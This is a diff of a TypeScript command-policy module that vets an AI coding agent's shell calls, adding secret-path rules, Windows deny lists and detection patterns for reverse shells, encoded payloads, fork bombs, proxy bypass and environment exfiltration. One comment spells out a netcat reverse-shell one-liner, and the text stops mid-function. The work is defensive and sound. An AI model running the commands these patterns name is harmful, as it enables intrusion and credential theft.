@@ -2,6 +2,8 @@ import path from "node:path";
 import { commandParts, ruleMatches } from "./machine-protocol";
 import { type OutboundCode, outboundUrlProblem } from "./outbound-url";
 
+export { maskKeyShapes } from "./outbound-url";
+
 /**
  * Deterministic command policy for computer turns (ADR 0029, ADR 0053 §3). No
  * model: plain parsing of the call Claude Code (or Codex) wants to make. The
@@ -38,6 +40,10 @@ import { type OutboundCode, outboundUrlProblem } from "./outbound-url";
  *   and writes outside the mission folder, system services, uploads, remote
  *   shells, global installs, inline code, anything it can't read plainly).
  *   The judge only classifies what is left; the deny list stays first and hard.
+ * - `badActorReason`: the rule for a run outside a mission and for `run_code`,
+ *   where nobody answers a card: only obvious harm (secrets, more rights, the
+ *   system, a shell handed to another machine, wiping, the proxy and firewall,
+ *   the runner, other users' files), read through every wrapper.
  * - `localVerdict`: the part the computer decides by itself (the rest goes to
  *   the server, which may ask a person).
  *
@@ -60,6 +66,11 @@ export interface CommandScope {
   home?: string;
   /** The runner's own home wherever it is (`AGENTES_RUNNER_HOME`): its accounts, tokens and settings are secrets. */
   runnerHome?: string;
+  /**
+   * `docker` and `podman` reach the agent's own rootless engine (`DOCKER_HOST` in its runtime dir, ADR 0169 and 0209):
+   * a privileged container, its capabilities and its engine's socket reach only the agent's user namespace.
+   */
+  rootlessContainers?: boolean;
 }
 
 type Word = { text: string; op?: undefined } | { text: string; op: "pipe" | "list" | "redirect" | "input" };
@@ -412,12 +423,21 @@ const SECRET_KEY_FILES = ["*.pem", "*.key", "id_rsa", "id_ed25519", "id_ecdsa", 
 
 const escapeRe = (s: string) => s.replace(/[.*+?^${}()|[\]\\/]/g, "\\$&");
 
+/** The system's own secrets, by absolute path: password hashes, sudo rules, ssh host keys, a process's environment. */
+const SYSTEM_SECRETS = [
+  "^/etc/(shadow|gshadow|sudoers|master\\.passwd)$",
+  "^/etc/sudoers\\.d(/|$)",
+  "^/etc/ssh/ssh_host_",
+  "^/proc/[^/]+/environ$",
+  "^/(var/)?run/secrets(/|$)",
+] as const;
+
 /**
  * Secrets a read never gets: keys, tokens, env files (not their `.env.example`
  * and the like, which hold none), the runner's own home.
  */
 const SECRET_PATH = new RegExp(
-  `(^|/)(${SECRET_DIRS.map(escapeRe).join("|")})(/|$)|^~/(${HOME_SECRET_DIRS.map(escapeRe).join("|")})(/|$)|(^|/)(${SECRET_FILES.map(escapeRe).join("|")}|\\.env(\\.(?!(example|sample|template|dist|defaults)$)[\\w.-]+)?|id_[a-z0-9]+(\\.pub)?|.*\\.pem|.*\\.key)$|(^|/)(${SECRET_SIGN_IN_FILES.map((f) => escapeRe(f).replaceAll("\\*", "[^/]+")).join("|")})$`,
+  `(^|/)(${SECRET_DIRS.map(escapeRe).join("|")})(/|$)|^~/(${HOME_SECRET_DIRS.map(escapeRe).join("|")})(/|$)|(^|/)(${SECRET_FILES.map(escapeRe).join("|")}|\\.env(\\.(?!(example|sample|template|dist|defaults)$)[\\w.-]+)?|id_[a-z0-9]+(\\.pub)?|.*\\.pem|.*\\.key)$|(^|/)(${SECRET_SIGN_IN_FILES.map((f) => escapeRe(f).replaceAll("\\*", "[^/]+")).join("|")})$|${SYSTEM_SECRETS.join("|")}`,
   "i",
 );
 
@@ -436,9 +456,12 @@ function secretPath(scope: CommandScope, p: string) {
   );
 }
 
-/** A command that names the variables pointing at an account's sign-in, or holding a plan's key or a Claude token. */
+/**
+ * A command that names the variables pointing at an account's sign-in, or holding a plan's key or a Claude token
+ * (PowerShell's `$env:…` and cmd's `%…%` too, in any case as Windows reads them).
+ */
 const SECRET_VARIABLE =
-  /\$\{?(CLAUDE_CONFIG_DIR|CODEX_HOME|ANTHROPIC_AUTH_TOKEN|ANTHROPIC_API_KEY|CLAUDE_CODE_OAUTH_TOKEN)\b/;
+  /(\$\{?|\$env:|%)(CLAUDE_CONFIG_DIR|CODEX_HOME|ANTHROPIC_AUTH_TOKEN|ANTHROPIC_API_KEY|CLAUDE_CODE_OAUTH_TOKEN)\b/i;
 
 /** A word of a line that can't be parsed plainly, without the quotes and substitution marks around it (`$(cat`, `x)`). */
 /** The closing marks are trimmed by hand: a `+$` over a long run of quotes backtracks quadratically. */
@@ -453,8 +476,64 @@ const bareWord = (w: string) => {
  * runs in; a bare one is tested as written).
  */
 const namesSecret = (p: string, scope?: CommandScope) =>
-  SECRET_PATH.test(p) ||
-  (scope !== undefined && (p.startsWith("/") || p.startsWith("~") || p.includes("..")) && secretPath(scope, p));
+  pathsOf(p).some(
+    (q) =>
+      SECRET_PATH.test(q) ||
+      (scope !== undefined && (q.startsWith("/") || q.startsWith("~") || q.includes("..")) && secretPath(scope, q)),
+  );
+
+/** Names a wildcard may stand for in a secret's path (`~/.s?h`, `id_*`, `.env*`): the secret folders' and files' own. */
+const SECRET_NAMES = [
+  ...new Set([
+    ...SECRET_DIRS.map((d) => d.split("/").pop() as string),
+    ...SECRET_FILES,
+    ...SECRET_KEY_FILES.map((f) => f.replaceAll("*", "x")),
+    ".env",
+    "auth.json",
+  ]),
+];
+
+/**
+ * A path segment's wildcards as a pattern; like the shell, `*` and `?` don't match a leading dot. A set with a
+ * reversed range (`[n-1]`, common in inline scripts) is no valid pattern: like the shell's, it matches nothing.
+ */
+const globPattern = (seg: string) => {
+  try {
+    return new RegExp(
+      `^${seg.startsWith(".") ? "" : "(?!\\.)"}${seg.replace(/\[(!?)([^\][]*)\]|[*?]|[^*?[]+|\[/g, (m, not, set) =>
+        m === "*"
+          ? "[^/]*"
+          : m === "?"
+            ? "[^/]"
+            : set !== undefined
+              ? `[${not ? "^" : ""}${set.replace(/[\\\]^]/g, "\\$&")}]`
+              : escapeRe(m),
+      )}$`,
+    );
+  } catch {
+    return /(?!)/;
+  }
+};
+
+/**
+ * The paths a word may name, for the secret checks: as written, with Windows' backslashes as slashes, and with each
+ * wildcard segment replaced by the secret names it matches with at least half of their letters its own (`.s?h`,
+ * `id_*`, `.env*`; `*`, `.*` and `*.json` stay ordinary globs).
+ */
+function pathsOf(word: string): string[] {
+  const forms = word.includes("\\") ? [word, word.replaceAll("\\", "/")] : [word];
+  return forms.flatMap((w) => {
+    if (!/[*?[]/.test(w)) return [w];
+    let out = [""];
+    for (const [i, seg] of w.split("/").entries()) {
+      const own = /[*?[]/.test(seg) ? seg.replace(/\[[^\][]*\]|[*?]/g, "").length : 0;
+      const names = own >= 2 ? SECRET_NAMES.filter((n) => own * 2 >= n.length && globPattern(seg).test(n)) : [];
+      const parts = names.length ? names : [seg];
+      out = out.flatMap((o) => parts.map((part) => (i === 0 ? part : `${o}/${part}`))).slice(0, 64);
+    }
+    return [w, ...out];
+  });
+}
 
 /** Claude Code's own tools that read files, and the arguments that say where (Grep's `pattern` is a search, not a path). */
 const FILE_READ_TOOLS: Record<string, readonly string[]> = {
@@ -485,16 +564,26 @@ export function secretRead(
   const cmds = simpleCommands(command);
   if (cmds) {
     return cmds.some(
-      (s) => s.argv.slice(1).some((a) => namesSecret(a, scope)) || s.reads.some((r) => namesSecret(r, scope)),
+      (s) =>
+        s.argv.slice(1).some((a, n) => !sshKeyArg(s.argv, n + 1) && namesSecret(a, scope)) ||
+        s.reads.some((r) => namesSecret(r, scope)),
     );
   }
   // Not plainly readable: any word that names a secret.
-  return commandParts(command).some((part) =>
-    part
-      .split(" ")
-      .slice(1)
-      .some((w) => namesSecret(bareWord(w), scope)),
-  );
+  return commandParts(command).some((part) => {
+    const words = part.split(" ");
+    return words.slice(1).some((w, n) => !sshKeyArg(words, n + 1) && namesSecret(bareWord(w), scope));
+  });
+}
+
+/** ssh, scp and sftp read the key they are given (`-i`, `-o IdentityFile=`) to sign in; it never leaves the computer. */
+const SSH_CLIENTS = new Set(["ssh", "scp", "sftp"]);
+function sshKeyArg(argv: readonly string[], at: number) {
+  if (!SSH_CLIENTS.has(baseName(argv[0] ?? ""))) return false;
+  const word = argv[at] ?? "";
+  const before = argv[at - 1] ?? "";
+  if (before === "-i" || /^-i\S/.test(word) || /^-oIdentityFile=/i.test(word)) return true;
+  return before === "-o" && /^IdentityFile=/i.test(word);
 }
 
 /** Commands that only read, whatever their arguments (minus the options that write or run). */
@@ -1130,7 +1219,12 @@ const WRAPPERS = new Set(["command", "builtin", "nice", "nohup", "time", "env", 
 /** Wrapper options that take the next word. */
 const WRAPPER_VALUE = new Set(["-n", "-u", "-C", "-S", "-P", "-w", "-t"]);
 
-const baseName = (word: string) => word.split("/").pop() ?? word;
+/**
+ * A program as the system finds it: the last part of its path (either separator), in lower case (Windows' and macOS's
+ * file systems ignore it), without Windows' `.exe`, `.com`, `.cmd` or `.bat` (`C:\Windows\System32\REG.exe` → `reg`).
+ */
+const baseName = (word: string) =>
+  (word.split(/[\\/]/).pop() ?? word).toLowerCase().replace(/\.(exe|com|cmd|bat)$/, "");
 
 /** The words with their wrappers (and the wrappers' options and env assignments) left out. */
 function unwrapped(words: string[]): string[] {
@@ -1870,7 +1964,7 @@ function outboundUrls(toolName: string, input: Record<string, unknown> | null | 
   if (toolName !== "Bash" || typeof input?.command !== "string") return [];
   const urls: string[] = [];
   for (const s of simpleCommands(input.command) ?? []) {
-    const base = (s.argv[0] ?? "").split("/").pop();
+    const base = baseName(s.argv[0] ?? "");
     if (base !== "curl" && base !== "wget") continue;
     for (const a of s.argv.slice(1)) {
       const v = a.replace(/^--url=/, "");
@@ -1901,7 +1995,8 @@ export function outboundCallProblem(
  * What the computer decides by itself, before anyone is asked: the deny list
  * and secrets are refused (`how`: what the refusal says to do to ask a
  * person), plain reads allowed; in a `plan` turn everything else is refused
- * too. Null: the server decides (`permission_prompt`: a mission's card, or
+ * too. A refusal's `code` uses the server's prompt codes (`never`, `secret`,
+ * `outbound.*`), and `policy` for a plan turn's. Null: the server decides (`permission_prompt`: a mission's card, or
  * code's rules for a run). The runner's prompt tool for Claude Code and its
  * answers to Codex's command approvals both start here; pushes come next
  * there (`approvalNeeded`).
@@ -1912,14 +2007,14 @@ export function localVerdict(
   scope: CommandScope | undefined,
   profile: CommandProfile,
   how: string = ASK_IN_CHAT,
-): { behavior: "allow" } | { behavior: "deny"; message: string; code?: string } | null {
+): { behavior: "allow" } | { behavior: "deny"; message: string; code: string } | null {
   const denied = deniedMessage(toolName, input, how);
-  if (denied) return { behavior: "deny", message: denied };
+  if (denied) return { behavior: "deny", message: denied, code: denied === SECRET_MESSAGE ? "secret" : "never" };
   const outbound = outboundCallProblem(toolName, input);
   if (outbound) return { behavior: "deny", message: outbound.message, code: outbound.code };
-  if (secretRead(toolName, input, scope)) return { behavior: "deny", message: SECRET_MESSAGE };
+  if (secretRead(toolName, input, scope)) return { behavior: "deny", message: SECRET_MESSAGE, code: "secret" };
   if (scope && readOnlyCall(toolName, input, scope, profile)) return { behavior: "allow" };
-  if (profile === "plan") return { behavior: "deny", message: PLAN_MESSAGE };
+  if (profile === "plan") return { behavior: "deny", message: PLAN_MESSAGE, code: "policy" };
   return null;
 }
 
@@ -1950,6 +2045,23 @@ const SYSTEM = new Set([
   "nvram",
   "pmset",
   "kextload",
+  // Windows
+  "runas",
+  "reg",
+  "schtasks",
+  "sc",
+  "bcdedit",
+  "diskpart",
+  "format",
+  "vssadmin",
+  "wbadmin",
+  "wevtutil",
+  "wmic",
+  "net",
+  "netsh",
+  "icacls",
+  "cacls",
+  "takeown",
 ]);
 const REMOTE = new Set(["ssh", "scp", "sftp", "rsync", "nc", "ncat", "netcat", "telnet", "ftp", "socat", "mosh"]);
 const WRITERS = new Set([
@@ -1970,7 +2082,22 @@ const WRITERS = new Set([
   "shred",
   "srm",
 ]);
-const INTERPRETERS = new Set(["sh", "bash", "zsh", "fish", "dash", "ksh", "eval", "exec", "source", ".", "xargs"]);
+const INTERPRETERS = new Set([
+  "sh",
+  "bash",
+  "zsh",
+  "fish",
+  "dash",
+  "ksh",
+  "eval",
+  "exec",
+  "source",
+  ".",
+  "xargs",
+  "cmd",
+  "powershell",
+  "pwsh",
+]);
 /** Claude Code's tools that write a file (Codex's file changes are asked as `Write`). */
 const FILE_WRITE_TOOLS = new Set(["Edit", "Write", "MultiEdit", "NotebookEdit"]);
 
@@ -1998,7 +2125,7 @@ export function forbiddenReason(
   if (!cmds || cmds.length === 0) return "it can't be read plainly";
   for (const s of cmds) {
     const [cmd = "", ...args] = s.argv;
-    const base = cmd.split("/").pop() ?? cmd;
+    const base = baseName(cmd);
     if (s.writes.some((w) => !insideOrTmp(scope, w))) return "it writes outside the mission folder";
     if (SYSTEM.has(base)) return "it changes the system";
     if (REMOTE.has(base)) return "it connects to another host";
@@ -2028,39 +2155,884 @@ export function forbiddenReason(
   return null;
 }
 
+// ── A run outside a mission: only obvious harm is refused ─────────────────────
+
 /**
- * What to do instead of a refused call, by `forbiddenReason`: the agent hears
- * why it was refused, so it changes the call instead of resending the same
- * one with another path (a heredoc refused three times in one run).
+ * The person's and the computer's own credential stores, by path: what `badActorReason` refuses wherever a word names
+ * one. A project's own key files (`.env`, `*.pem`, `credentials.json`) aren't here: `secretRead` keeps the brain from
+ * reading those, and `run_code` works with them.
  */
-const FORBIDDEN_HINTS: Record<string, string> = {
-  "it can't be read plainly":
-    "Commands are checked word by word, so heredocs (<<), $(…), backticks, variables, `FOO=1 cmd` and & jobs are never run here. Write or change files with the Edit and Write tools, then run plain commands one at a time.",
-  "it writes outside the mission folder": "Write only inside your folder or /tmp.",
-  "it changes files outside the mission folder": "Change files only inside your folder or /tmp.",
-  "it runs other commands": "Run the commands themselves, one at a time, not through a shell, eval or xargs.",
-  "it runs code given inline":
-    "Code passed on the command line (node -e, python -c…) is never run without a person: write it to a file in your folder and run that file.",
-  "it touches secrets": SECRET_MESSAGE,
+const SECRET_STORE = new RegExp(
+  [
+    `(^|/)(${SECRET_DIRS.map(escapeRe).join("|")})(/|$)`,
+    `^~/(${HOME_SECRET_DIRS.map(escapeRe).join("|")})(/|$)`,
+    `(^|/)(${SECRET_FILES.filter((f) => !f.startsWith("credentials"))
+      .map(escapeRe)
+      .join("|")})$`,
+    `(^|/)(${SECRET_SIGN_IN_FILES.map((f) => escapeRe(f).replaceAll("\\*", "[^/]+")).join("|")})$`,
+    ...SYSTEM_SECRETS,
+  ].join("|"),
+  "i",
+);
+
+const storeSecret = (word: string, scope: CommandScope) => pathsOf(word).some((p) => storeSecretPath(p, scope));
+
+const storeSecretPath = (p: string, scope: CommandScope) => {
+  if (SECRET_STORE.test(p)) return true;
+  const r = resolveIn(scope, p);
+  if (r === null) return false;
+  const home = scope.home;
+  return (
+    SECRET_STORE.test(r) ||
+    (home !== undefined && HOME_SECRET_DIRS.some((d) => under(r, path.join(home, d)))) ||
+    (scope.runnerHome !== undefined && under(r, path.resolve(scope.runnerHome)))
+  );
 };
 
-export const forbiddenHint = (reason: string) => FORBIDDEN_HINTS[reason] ?? null;
+/** Folders whose files are the system's: `/usr/local` (Homebrew's, a user's own installs) and harmless devices aside. */
+const SYSTEM_DIRS =
+  /^\/(etc|usr(?!\/local(\/|$))|boot|sys|proc|bin|sbin|lib|lib32|lib64|System|Library|private\/etc|dev(?!\/(null|zero|stdout|stderr|tty|fd|shm)(\/|$)))(\/|$)/;
+/** What a recursive delete wipes the computer or a whole home with (any case: macOS and Windows ignore it). */
+const WHOLE_TREE =
+  /^(\/+\*?|~\/?\*?|(\$\{?(HOME|USERPROFILE)\}?|\$env:(USERPROFILE|HOMEPATH|SystemDrive|SystemRoot|windir)|%(USERPROFILE|HOMEPATH|SystemDrive|SystemRoot|windir)%)\/?\*?|\/(home|Users|root|bin|boot|dev|etc|lib|lib64|opt|proc|sbin|srv|sys|usr|var|System|Library|Applications|private|Windows|Program Files( \(x86\))?|ProgramData)\/?\*?)$/i;
+/**
+ * A Windows drive at the start of a path: `C:` (`C:\Users`, `C:/Users`), or Git Bash's `/c` alone or before Windows'
+ * own folders (`/c/Users`); elsewhere a one-letter folder stays a POSIX one (`/a/usr`).
+ */
+const DRIVE = /^(?:[a-z]:(?=\/|$)|\/[a-z](?=\/?$|\/(Users|Windows|Program Files( \(x86\))?|ProgramData)(\/|$)))/i;
 
-/** `forbiddenReason`'s reasons as the code a refusal carries, so the apps say why in the person's words. */
-const FORBIDDEN_CODES: Record<string, string> = {
-  "it touches secrets": "secret",
-  "it can't be read plainly": "unclear",
-  "it writes outside the mission folder": "outside",
-  "it changes files outside the mission folder": "outside",
-  "it sends data or saves outside the mission folder": "upload",
-  "it changes the system": "system",
-  "it connects to another host": "remote",
-  "it runs other commands": "shell",
-  "it runs code given inline": "inline",
-  "it installs globally": "global",
+const PRIVILEGE = /^(sudo|sudoedit|su|doas|pkexec|run0|gsudo)$/;
+const SYSTEM_TOOLS =
+  /^(mount|umount|swapon|swapoff|modprobe|insmod|rmmod|kexec|visudo|passwd|chpasswd|useradd|userdel|usermod|groupadd|groupdel|groupmod|adduser|deluser|shutdown|reboot|halt|poweroff|telinit|csrutil|nvram|kextload|kextunload|setenforce|grub-install|update-grub)$/;
+const WIPE_TOOLS = /^(mkfs(\..+)?|mke2fs|mkswap|wipefs|fdisk|sfdisk|cfdisk|gdisk|sgdisk|parted)$/;
+const FIREWALL_TOOLS =
+  /^(iptables|ip6tables|iptables-restore|ip6tables-restore|iptables-legacy|nft|ufw|firewall-cmd|pfctl)$/;
+const SYSTEMCTL_CHANGES =
+  /^(start|stop|restart|reload|try-restart|reload-or-restart|enable|disable|reenable|mask|unmask|kill|edit|set-property|isolate|daemon-reload|daemon-reexec|poweroff|reboot|halt|suspend|hibernate|link|revert|preset|set-default)$/;
+/** Programs that send what they read to another machine. */
+const SENDERS =
+  /^(curl|wget|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|http|https|xh|mail|mailx|sendmail|openssl|ftp|invoke-webrequest|iwr|invoke-restmethod|irm)$/;
+
+/** A shell's network redirection and the usual one-liners that hand a shell to another machine. */
+const SHELL_LITERAL = /["'`](\/bin\/)?(ba|z|da|k)?sh\b/;
+const REVERSE_SHELL: ReadonlyArray<readonly RegExp[]> = [
+  [/\/dev\/(tcp|udp)\//i],
+  [/\/inet6?\/(tcp|udp)\//],
+  // `cat /tmp/f | sh -i 2>&1 | nc host 4444 > /tmp/f`, `nc host 4444 < f | bash > f`: a shell reading a network tool.
+  [
+    /\b(ba|z|da|k)?sh\s+-i\b|\|\s*(\S*\/)?(ba|z|da|k)?sh\b(\s+-[is]\b)?\s*($|[|<>&;\d])|(^|[;&|(]\s*)(\S*\/)?(ba|z|da|k)?sh\s*</m,
+    /\b(nc|ncat|netcat|telnet|socat)\b|\bopenssl\s+s_client\b/,
+  ],
+  [/\bsocket\b/, /\bpty\.spawn\b|\bos\.dup2\b|\bdup2\s*\(/],
+  [/\bsocket\b|\bcreate_connection\b/, /\bstdin\s*=/, SHELL_LITERAL],
+  [/\bsocket\s*\(/i, /\bopen\s*\(\s*STD(IN|OUT|ERR)\s*,\s*["']?[>&]/],
+  [/IO::Socket/, /\b(system|exec)\b|fdopen|\/bin\/(ba)?sh/],
+  [/\bfsockopen\b/, /\b(exec|shell_exec|system|passthru|proc_open|popen)\s*\(|\/bin\/(ba)?sh/],
+  [/\bTCPSocket\b/, /\b(exec|spawn|system)\b|IO\.popen|\/bin\/(ba)?sh/],
+  [/\bnet\.(connect|createConnection|Socket)\b/, /\/bin\/(ba)?sh/],
+  [/\bnet\.(connect|createConnection|Socket)\b|require\(\s*["'](node:)?net["']\s*\)/, /child_process/, SHELL_LITERAL],
+  // PowerShell's: what comes in on a `Net.Sockets.TcpClient` is run with `Invoke-Expression` (Elixir's `iex` and its
+  // own `TCPClient` modules aren't it).
+  [/\bsockets\.tcpclient\b/i, /\b(iex|invoke-expression)\b/i],
+];
+/** Code it hides by encoding it, then runs: `base64 -d | sh`, `eval "$(… | base64 -d)"`, `exec(b64decode(…))`. */
+const DECODE = String.raw`(\bbase64\b[^|;&\n]*\s(-d|-D|--decode)\b|\bxxd\b[^|;&\n]*\s-r\b|\bopenssl\s+(base64|enc)\b[^|;&\n]*\s-d\b)`;
+const ENCODED_RUN: ReadonlyArray<readonly RegExp[]> = [
+  // Piped into a shell or an interpreter that reads its program from that pipe (`| python3 -m json.tool` reads data).
+  [
+    new RegExp(
+      String.raw`${DECODE}[^;&\n]*\|\s*(\S*\/)?((ba|z|da|k)?sh|python[\d.]*|perl|ruby|node|php)\b(\s+-[\w-]*)*\s*($|[|;&)])`,
+      "m",
+    ),
+  ],
+  [new RegExp(String.raw`\b(eval|(ba|z|da|k)?sh\s+-c)\s+["']?\$\([^)]*${DECODE}`)],
+  [/\bb64decode\b|\batob\s*\(|["']base64["']/, /(?<![.\w])(exec|eval)\s*\(|\bnew\s+Function\b/],
+  [/\bfrombase64string\b/i, /\b(iex|invoke-expression)\b|\[scriptblock\]::create/i],
+];
+/**
+ * The runner's own variables read (`$AGENTES_MCP_TOKEN`, `os.environ["AGENTES_RUNNER_HOME"]`, PowerShell's
+ * `$env:AGENTES_MCP_TOKEN`, cmd's `%AGENTES_MCP_TOKEN%`), not their names in a search. Any case: Windows ignores it.
+ */
+const RUNNER_VARIABLE =
+  /(\$\{?|\$env:|%|environ\s*\[\s*["']|environ\.get\(\s*["']|getenv\(\s*["']|getenvironmentvariable\(\s*["']|process\.env\.|process\.env\[\s*["']|ENV\[\s*["'])AGENTES_(RUNNER_HOME|MCP_TOKEN|MCP_SOCKET)\b/i;
+const FORK_BOMB = /([\w:]+)\s*\(\s*\)\s*\{\s*\1\s*\|\s*\1\s*&/;
+/** The proxy variables set, emptied or dropped, in a shell or in code (`HTTPS_PROXY= curl`, `del os.environ["NO_PROXY"]`). */
+const PROXY_TEXT: readonly RegExp[] = [
+  /(^|\W)(https?|all|ftp|socks)_proxy["'\]]*\s*=(?!=)/i,
+  /\bunset\b[^\n;&|]*\b(https?|all|ftp)_proxy\b/i,
+  /\benv\b[^\n;&|]*\s-u\s*(https?|all|ftp)_proxy\b/i,
+  /\b(del|delete)\s[^\n;]*\b(https?|all)_proxy\b|\.pop\(\s*["'](https?|all)_proxy/i,
+];
+/** `NO_PROXY=…`'s value: what it sends around the proxy, fine while that is only this computer (`localhost,127.0.0.1`). */
+const NO_PROXY_VALUE = /(^|\W)no_proxy["'\]]*\s*=(?!=)\s*["']?([^"'\s;&|)]*)/gi;
+const LOCAL_HOST =
+  /^(\.?localhost|127(\.\d+){0,3}(\/\d+)?|::1|\[::1\]|0\.0\.0\.0|[\w-]+\.local|\.local|host\.docker\.internal)$/i;
+const proxyBypass = (text: string) =>
+  [...text.matchAll(NO_PROXY_VALUE)].some((m) =>
+    (m[2] ?? "").split(",").some((host) => host !== "" && !LOCAL_HOST.test(host.trim())),
+  );
+/** Code that sends its whole environment out: the dump and a network call in the same code. */
+const ENV_DUMP_CODE =
+  /JSON\.stringify\(\s*process\.env\s*\)|Object\.(entries|values)\(\s*process\.env\s*\)|\bdict\(\s*os\.environ\s*\)|\bos\.environ\.copy\(\)|\b(str|repr)\(\s*os\.environ\s*\)|json\.dumps\(\s*(dict\(\s*)?os\.environ\b|\bENV\.to_h\b/;
+const NET_CODE =
+  /\b(requests|urllib|httpx|aiohttp|http\.client|fetch|axios|https?\.(request|get)|socket|smtplib|Net::HTTP)\b/;
+
+/** One command found anywhere in a text, read loosely: no quoting rule makes it disappear. */
+interface Loose {
+  /** Its words as written, assignments and wrappers included. */
+  raw: string[];
+  /** The command itself: assignments, wrappers and shell keywords left out. */
+  argv: string[];
+  /** Files written with `>`, `>>`, `&>`. */
+  writes: string[];
+  /** Files read with `<`. */
+  reads: string[];
+  /** PowerShell's text a command runs, read whole for its cmdlets (`powershellProblem`); the entry has no words. */
+  powershell?: string;
+}
+
+/** Programs whose quoted words are commands or code of their own (`bash -c '…'`, `python3 -c '…'`, `eval '…'`). */
+const RUNS_ITS_WORDS =
+  /^(sh|bash|zsh|dash|ksh|fish|busybox|eval|exec|xargs|watch|timeout|nohup|env|su|sudo|doas|runuser|flock|parallel|script|setsid|start|call|tmux|screen|systemd-run|python[\d.]*|node|nodejs|bun|deno|ruby|perl|php|g?awk|mawk|nawk|iex|invoke-expression)$/;
+const CODE_RUNNERS = /^(python[\d.]*|node|nodejs|bun|deno|ruby|perl|php|g?awk|mawk|nawk)$/;
+const WINDOWS_SHELLS = /^(cmd|powershell|pwsh)$/;
+/**
+ * A Windows shell's text as the loose scan reads it: a backslash is part of a path, not an escape; cmd's `^` escapes
+ * the next character and its `'` is a plain one; PowerShell's backtick escapes (`r^eg` and `re`g` run `reg`).
+ */
+const windowsText = (program: string, text: string) =>
+  text.replaceAll("\\", "/").replace(program === "cmd" ? /[\^']/g : /`/g, "");
+/**
+ * Programs that run the rest of their words as a command, after options of their own (`taskset -c 0 cmd`, cmd's
+ * `start /b cmd` and `call cmd`, Git Bash's `start cmd` and `winpty cmd`).
+ */
+const LAUNCHERS =
+  /^(setsid|nice|ionice|stdbuf|taskset|chrt|unbuffer|caffeinate|systemd-run|xvfb-run|dbus-run-session|parallel|screen|runuser|cgexec|numactl|prlimit|strace|ltrace|setpriv|chpst|start|call|winpty)$/;
+/** What runs the text piped into it as commands (`echo '…' | bash`, `… | crontab -`, `… | powershell -Command -`). */
+const FED_COMMANDS = /^(sh|bash|zsh|dash|ksh|fish|at|batch|crontab|cmd|powershell|pwsh)$/;
+const SHELL_KEYWORDS = new Set(["if", "then", "else", "elif", "do", "while", "until", "!", "exec", "time"]);
+const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;
+const HEREDOC = /(?<!<)<<-?\s*(['"]?)([A-Za-z_][\w.-]*)\1/g;
+
+function looseArgv(words: string[]): string[] {
+  let w = words;
+  for (let guard = 0; guard < 20 && w.length > 0; guard++) {
+    const head = baseName(w[0] as string);
+    if (ASSIGNMENT.test(w[0] as string) || SHELL_KEYWORDS.has(head)) w = w.slice(1);
+    else if (head === "timeout" || head === "xargs") {
+      w = w.slice(1);
+      while (w[0]?.startsWith("-")) w = w.slice(/^-[IdEsLnPak]$/.test(w[0]) ? 2 : 1);
+      if (head === "timeout") w = w.slice(1);
+    } else {
+      const u = unwrapped(w);
+      if (u.length === w.length) return w;
+      w = u;
+    }
+  }
+  return w;
+}
+
+/**
+ * A shell text's lines with each heredoc's body taken out, and those bodies with the program that runs them (the
+ * one it feeds, or the one that is piped on): a body fed to `cat` or `tee` is a file's text, not commands.
+ */
+function heredocs(text: string): { shell: string; bodies: Array<{ runner: string; body: string }> } {
+  if (!text.includes("<<")) return { shell: text, bodies: [] };
+  const lines = text.split("\n");
+  const kept: string[] = [];
+  const bodies: Array<{ runner: string; body: string }> = [];
+  for (let i = 0; i < lines.length; i++) {
+    const line = lines[i] as string;
+    kept.push(line.replace(HEREDOC, " "));
+    for (const m of line.matchAll(HEREDOC)) {
+      let end = i + 1;
+      while (end < lines.length && (lines[end] as string).replace(/^\t+/, "").trimEnd() !== m[2]) end++;
+      const owner = baseName(
+        looseArgv(
+          (
+            line
+              .slice(0, m.index)
+              .split(/[;&|(]/)
+              .pop() ?? ""
+          )
+            .split(/\s+/)
+            .filter(Boolean),
+        )[0] ?? "",
+      );
+      const next = baseName(/\|\s*(\S+)/.exec(line.slice((m.index ?? 0) + m[0].length))?.[1] ?? "");
+      const runs = (p: string) => SHELL_NAMES.test(p) || WINDOWS_SHELLS.test(p) || CODE_RUNNERS.test(p);
+      bodies.push({ runner: runs(next) ? next : owner, body: lines.slice(i + 1, end).join("\n") });
+      i = end;
+    }
+  }
+  return { shell: kept.join("\n"), bodies };
+}
+
+/**
+ * Every command a text may run, read loosely into `out`: lists, pipes, `$(…)`, backticks, a shell's or an
+ * interpreter's quoted script, a heredoc fed to one (`code`: the text is Python or JavaScript, where every string may
+ * be a command: `os.system("…")`, `subprocess.run(["…"])`). A quoted word given to anything else (a commit message, a
+ * remote command for ssh) is a word.
+ */
+function looseScan(text: string, code: boolean, depth: number, out: Loose[]): void {
+  if (depth > 4) return;
+  /** A Windows shell's script (`-Command`'s words, a heredoc, piped text): its commands, and PowerShell's whole. */
+  const windows = (program: string, script: string) => {
+    const t = windowsText(program, script);
+    if (program !== "cmd") out.push({ raw: [], argv: [], writes: [], reads: [], powershell: t });
+    looseScan(t, false, depth + 1, out);
+  };
+  /** What a command runs when it is a Windows shell (`cmd /c …`, `powershell -c …`), behind a launcher too. */
+  const windowsRun = (a: readonly string[]) => {
+    const program = baseName(a[0] ?? "");
+    const script = WINDOWS_SHELLS.test(program) ? windowsScript(program, a.slice(1)) : null;
+    if (script !== null) windows(program, script);
+  };
+  const { shell, bodies } = code ? { shell: text, bodies: [] } : heredocs(text);
+  for (const b of bodies) {
+    if (SHELL_NAMES.test(b.runner)) looseScan(b.body, false, depth + 1, out);
+    else if (WINDOWS_SHELLS.test(b.runner)) windows(b.runner, b.body);
+    else if (CODE_RUNNERS.test(b.runner)) looseScan(b.body, true, depth + 1, out);
+  }
+  let words: string[] = [];
+  let quoted: string[] = [];
+  let writes: string[] = [];
+  let reads: string[] = [];
+  let cur = "";
+  let has = false;
+  let target: "write" | "read" | null = null;
+  const endWord = () => {
+    if (has) {
+      (target === "write" ? writes : target === "read" ? reads : words).push(cur);
+      target = null;
+    }
+    cur = "";
+    has = false;
+  };
+  let fed: string[] = [];
+  const endCommand = (sep?: string) => {
+    endWord();
+    const argv = looseArgv(words);
+    if (words.length || writes.length || reads.length) out.push({ raw: words, argv, writes, reads });
+    const head = baseName(argv[0] ?? "");
+    const rawHead = baseName(words.find((w) => !ASSIGNMENT.test(w)) ?? "");
+    // Text piped from `echo` or `printf` into a shell, a code runner or cron: commands too. Only cron's lines open
+    // with a schedule (`@reboot`, or five fields) to leave out.
+    for (const f of fed) {
+      if (head === "crontab") looseScan(f.replace(/^\s*(@\w+\s+|(\S+\s+){5})/gm, ""), false, depth + 1, out);
